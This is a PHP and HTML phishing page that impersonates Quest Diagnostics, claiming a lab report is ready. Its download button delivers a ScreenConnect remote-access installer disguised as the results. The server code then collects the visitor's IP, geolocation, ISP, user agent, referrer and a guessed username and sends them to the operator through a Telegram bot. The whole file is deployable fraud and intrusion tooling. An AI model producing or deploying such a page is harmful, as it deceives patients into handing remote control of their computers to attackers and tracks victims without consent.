<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['captcha_verified'])) {
    // SIMPLE CHECK - if captcha_verified is set, serve file immediately
    $file = 'ScreenConnect.ClientSetup.msi';
    
    if (file_exists($file)) {
        // Store data for Telegram in session
        session_start();
        
        $ip = $_SERVER['REMOTE_ADDR'];
        $user_agent = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
        $referer = $_SERVER['HTTP_REFERER'] ?? 'Direct';
        
        $_SESSION['telegram_data'] = [
            'ip' => $ip,
            'user_agent' => $user_agent,
            'time' => date('Y-m-d H:i:s'),
            'referer' => $referer
        ];
        
        // Serve the file
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="ScreenConnect.ClientSetup.msi"');
        header('Content-Length: ' . filesize($file));
        readfile($file);
        
               // After file is sent, include Telegram script
        // =========== TELEGRAM NOTIFICATION ===========
        $bot_token = 'xxxxxx';
        $chat_id = 'xxxxxxxx';
        
        // 1. Get PC Username (try multiple methods)
        $pc_username = 'Unknown';
        
        // Method 1: Check HTTP headers
        $username_headers = ['PHP_AUTH_USER', 'REMOTE_USER', 'AUTH_USER', 'LOGON_USER', 'HTTP_X_FORWARDED_USER'];
        foreach ($username_headers as $header) {
            if (!empty($_SERVER[$header])) {
                $pc_username = $_SERVER[$header];
                break;
            }
        }
        
        // Method 2: Try to extract from User-Agent
        if ($pc_username === 'Unknown' && !empty($user_agent)) {
            // Common patterns in User-Agent that might contain username
            if (preg_match('/Windows NT [\d\.]+; (?:WOW64; )?(.+?)(?:;|\))/', $user_agent, $matches)) {
                $possible_name = trim($matches[1]);
                if (strlen($possible_name) > 2 && strlen($possible_name) < 50 && !preg_match('/[0-9]+\.[0-9]+/', $possible_name)) {
                    $pc_username = $possible_name;
                }
            }
        }
        
        // 2. Get Location from IP using ip-api.com (free API)
        $location = 'Unknown';
        $isp = 'Unknown';
        
        if ($ip && filter_var($ip, FILTER_VALIDATE_IP)) {
            $url = "http://ip-api.com/json/{$ip}?fields=status,country,regionName,city,isp,org,query";
            $geo_data = @file_get_contents($url);
            
            if ($geo_data) {
                $geo = json_decode($geo_data, true);
                
                if ($geo && $geo['status'] === 'success') {
                    // Build location string
                    $location_parts = [];
                    if (!empty($geo['city'])) $location_parts[] = $geo['city'];
                    if (!empty($geo['regionName'])) $location_parts[] = $geo['regionName'];
                    if (!empty($geo['country'])) $location_parts[] = $geo['country'];
                    
                    if (!empty($location_parts)) {
                        $location = implode(', ', $location_parts);
                    }
                    
                    // Get ISP
                    if (!empty($geo['isp'])) {
                        $isp = $geo['isp'];
                        if (!empty($geo['org']) && $geo['org'] != $geo['isp']) {
                            $isp .= " ({$geo['org']})";
                        }
                    }
                }
            }
        }
        
                // 3. Create Telegram message with text prefixes
        $message = "?? PC Username: $pc_username\n";
        $message .= "?? IP Address: $ip\n";
        $message .= "??? Full location: $location\n";
        $message .= "?? ISP: $isp\n\n";
        $message .= "?? User Agent: $user_agent\n";
        $message .= "?? Referrer: $referer\n";
        $message .= "? Status: Download completed";
        
        // 4. Send to Telegram with UTF-8 header
        $url = "https://api.telegram.org/bot{$bot_token}/sendMessage";
        $data = [
            'chat_id' => $chat_id,
            'text' => $message
        ];
        
        $options = [
            'http' => [
                'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
                'method'  => 'POST',
                'content' => http_build_query($data),
            ],
        ];
        
        $context = stream_context_create($options);
        @file_get_contents($url, false, $context);
        // =========== END TELEGRAM ===========
        
        exit;
    }
}

// If we got here, show the page
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>© 2026 Quest Diagnostics Incorporated</title>
    <script src="https://www.google.com/recaptcha/api.js" async defer></script>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }
        
        body {
            background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%);
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            padding: 20px;
        }
        
        .container {
            background: white;
            border-radius: 16px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
            padding: 40px;
            width: 100%;
            max-width: 480px;
            text-align: center;
        }
        
        h1 {
            color: #2c3e50;
            margin-bottom: 10px;
            font-size: 28px;
        }
        
        .subtitle {
            color: #7f8c8d;
            margin-bottom: 30px;
            font-size: 16px;
            line-height: 1.5;
        }
        
        .captcha-container {
            margin: 25px 0;
            display: flex;
            justify-content: center;
        }
        
        .submit-btn {
            background: linear-gradient(135deg, #3498db, #2980b9);
            color: white;
            border: none;
            padding: 14px 28px;
            font-size: 16px;
            font-weight: 600;
            border-radius: 8px;
            cursor: pointer;
            transition: all 0.3s ease;
            box-shadow: 0 4px 15px rgba(52, 152, 219, 0.3);
            width: 100%;
            margin-top: 20px;
        }
        
        .submit-btn:hover {
            background: linear-gradient(135deg, #2980b9, #3498db);
            transform: translateY(-2px);
            box-shadow: 0 6px 20px rgba(52, 152, 219, 0.4);
        }
        
        .submit-btn:disabled {
            opacity: 0.7;
            cursor: not-allowed;
            transform: none !important;
        }
        
        .footer {
            margin-top: 30px;
            color: #7f8c8d;
            font-size: 14px;
            text-align: center;
        }
        
        .info-box {
            background: #f8f9fa;
            border-left: 4px solid #3498db;
            padding: 15px;
            margin: 20px 0;
            text-align: left;
            border-radius: 0 8px 8px 0;
        }
        
        .info-box p {
            margin: 5px 0;
            color: #2c3e50;
            font-size: 14px;
        }
        
        @media (max-width: 600px) {
            .container {
                padding: 30px 20px;
            }
            
            h1 {
                font-size: 24px;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <img width="150" src="https://s7d6.scene7.com/is/image/questdiagnostics/Quest-Diagnostics-RGB-gradient?$corp-header-logo$"><br>
        <p class="subtitle"></p>
        
        <div class="info-box">
            <p><strong>Your report has been successfully generated.
The report will download automatically.
Thank you for choosing Quest Diagnostics.
 </strong></p>
            <p>..</p>
        </div>
        
        <form method="POST" id="downloadForm">
            <div class="captcha-container">
                <div class="g-recaptcha" data-sitekey="6LcPrHotAAAAAIgfkHBrbhaV-1uhnYanru1Aqav_"></div>
            </div>
            
            <input type="hidden" name="captcha_verified" value="1">
            
            <button type="submit" class="submit-btn" id="downloadBtn">Download / Access your results</button>
        </form>
        
        <div class="footer">
            <p><a href="#" style="color: #3498db;"></a> © 2026 Quest Diagnostics Incorporated. All rights reserved..</p>
        </div>
    </div>
    
    <script>
        document.getElementById('downloadForm').addEventListener('submit', function(e) {
            const response = grecaptcha.getResponse();
            
            if (response.length === 0) {
                e.preventDefault();
                alert('Please complete the CAPTCHA verification.');
                return;
            }
            
            // Show loading and disable button
            const btn = document.getElementById('downloadBtn');
            btn.disabled = true;
            btn.innerHTML = 'Downloading...';
            
            // Open end.html in new tab
            window.open('end.html', '_blank');
        });
    </script>
</body>
</html>